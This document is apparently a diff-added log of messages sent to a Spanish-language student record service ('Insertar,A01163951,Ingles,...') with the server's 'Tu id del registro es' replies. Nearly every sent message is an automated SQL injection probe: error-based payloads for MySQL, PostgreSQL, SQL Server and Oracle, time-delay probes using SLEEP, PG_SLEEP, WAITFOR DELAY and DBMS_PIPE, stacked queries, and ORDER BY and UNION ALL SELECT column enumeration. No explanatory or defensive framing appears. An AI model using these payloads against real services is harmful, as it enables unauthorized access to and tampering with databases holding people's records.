+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  965625
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND (SELECT 5036 FROM(SELECT COUNT(*),CONCAT(0x3a6d6c733a,(SELECT (CASE WHEN (5036=5036) THEN 1 ELSE 0 END)),0x3a696a673a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'kZzq'='kZzq,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  95758
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 8858=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (8858=8858) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND (7361=7361,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  285846
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 8858=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (8858=8858) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC),10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  380022
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 8858=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (8858=8858) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND ('oSRS'='oSRS,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  125855
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 8858=CAST(CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (8858=8858) THEN 1 ELSE 0 END))::text||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58) AS NUMERIC) AND 'rwRP'='rwRP,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  929099
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 2318=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2318=2318) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND (4449=4449,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  688186
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 2318=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2318=2318) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))),10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  96195
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 2318=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2318=2318) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND ('lxzp'='lxzp,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  488321
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 2318=CONVERT(INT,(CHAR(58)+CHAR(109)+CHAR(108)+CHAR(115)+CHAR(58)+(SELECT (CASE WHEN (2318=2318) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(105)+CHAR(106)+CHAR(103)+CHAR(58))) AND 'jrrr'='jrrr,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  452008
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 2008=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2008=2008) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND (7252=7252,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  110018
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 2008=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2008=2008) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL),10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  431653
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 2008=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2008=2008) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND ('Jyon'='Jyon,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  384330
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 2008=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(109)||CHR(108)||CHR(115)||CHR(58)||(SELECT (CASE WHEN (2008=2008) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(105)||CHR(106)||CHR(103)||CHR(58)||CHR(62))) FROM DUAL) AND 'xnvZ'='xnvZ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  284916
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1); SELECT SLEEP(5);-- ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  132576
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1; SELECT SLEEP(5);-- ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  80407
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'); SELECT SLEEP(5);-- ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  329134
+2012-05-02 19:34:24 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'; SELECT SLEEP(5);-- ,10
+2012-05-02 19:34:24 -0500 respuesta recibida: Tu id del registro es  729225
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1); SELECT PG_SLEEP(5);--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  628495
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1; SELECT PG_SLEEP(5);--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  215747
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'); SELECT PG_SLEEP(5);--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  195172
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'; SELECT PG_SLEEP(5);--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  988508
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1); WAITFOR DELAY '0:0:5';--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  777049
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1; WAITFOR DELAY '0:0:5';--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  896665
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'); WAITFOR DELAY '0:0:5';--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  774307
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1'; WAITFOR DELAY '0:0:5';--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  870568
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND SLEEP(5) AND (7635=7635,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  158062
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND SLEEP(5),10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  461407
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND SLEEP(5) AND ('PIZb'='PIZb,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  410660
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND SLEEP(5) AND 'reMr'='reMr,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  942061
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 5422=(SELECT 5422 FROM PG_SLEEP(5)) AND (9556=9556,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  771595
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 5422=(SELECT 5422 FROM PG_SLEEP(5)),10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  485982
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 5422=(SELECT 5422 FROM PG_SLEEP(5)) AND ('CDTn'='CDTn,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  525373
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 5422=(SELECT 5422 FROM PG_SLEEP(5)) AND 'gIVb'='gIVb,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  311964
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) WAITFOR DELAY '0:0:5'--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  801184
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 WAITFOR DELAY '0:0:5'--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  924664
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') WAITFOR DELAY '0:0:5'--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  915417
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' WAITFOR DELAY '0:0:5'--,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  139147
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) AND 5935=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(77)||CHR(97)||CHR(66),5) AND (4660=4660,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  564103
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 AND 5935=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(77)||CHR(97)||CHR(66),5),10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  371721
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') AND 5935=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(77)||CHR(97)||CHR(66),5) AND ('zUFw'='zUFw,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  411242
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' AND 5935=DBMS_PIPE.RECEIVE_MESSAGE(CHR(72)||CHR(77)||CHR(97)||CHR(66),5) AND 'LoWM'='LoWM,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  327353
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) ORDER BY 1#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  915903
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) ORDER BY 8975#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  853471
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  443481
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  547011
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  184869
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  406391
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  837454
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  848800
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  219866
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  627028
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  210522
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  707275
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 ORDER BY 1#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  382665
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 ORDER BY 8035#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  953276
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  370897
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  169265
+2012-05-02 19:34:25 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL#,10
+2012-05-02 19:34:25 -0500 respuesta recibida: Tu id del registro es  230540
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  551110
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  808215
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  110658
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  324884
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  361792
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  45779
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  510605
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') ORDER BY 1#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  576828
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') ORDER BY 3599#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  42467
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  221740
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  556742
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  956962
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  981823
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  130027
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  268473
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  886983
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  846638
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  709396
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  151717
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' ORDER BY 1#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  703991
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' ORDER BY 8465#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  503426
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  256009
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  226141
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  138614
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  431707
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  656872
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  713863
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  762481
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  588269
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  697088
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  775501
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) ORDER BY 1-- ,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  757950
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) ORDER BY 2547-- ,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  84693
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL-- ,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  194632
+2012-05-02 19:34:26 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL-- ,10
+2012-05-02 19:34:26 -0500 respuesta recibida: Tu id del registro es  171003
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  438743
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  726233
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  126311
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  483359
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  135784
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  653800
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  162390
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  544139
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, 'zythpvpBCB'-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  975085
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, 'uZEhaQtEYq', NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  128084
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, 'UrruGreioc', NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  623701
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, NULL, 'EJUrRCCpuM', NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  184474
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, NULL, NULL, 'mhTOOUeLSd', NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  782993
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT NULL, 'KQNLxhFaJA', NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  442949
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1) UNION ALL SELECT 'LWXGOBmXmm', NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  763657
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-4701) UNION ALL SELECT NULL, NULL, NULL, 'FrWjddGWPp', NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  871322
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-2422) UNION ALL SELECT 'BRsRXyyhsi', NULL, NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  793045
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-4477) UNION ALL SELECT NULL, 'WBafcOZnxW', NULL, NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  573738
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-7542) UNION ALL SELECT NULL, NULL, 'sQELkxZnQg', NULL, NULL, NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  689066
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-9598) UNION ALL SELECT NULL, NULL, NULL, NULL, 'DdmfFPoFGJ', NULL, NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  49571
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-2011) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, 'QBPnoYoBSu'-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  592564
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,-1234) UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, 'fLGnVSJXbe', NULL-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  371748
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 ORDER BY 1-- ,10
+2012-05-02 19:34:27 -0500 respuesta recibida: Tu id del registro es  991395
+2012-05-02 19:34:27 -0500 mensaje enviado: Insertar,A01163951,Ingles,1 ORDER BY 7929-- ,10
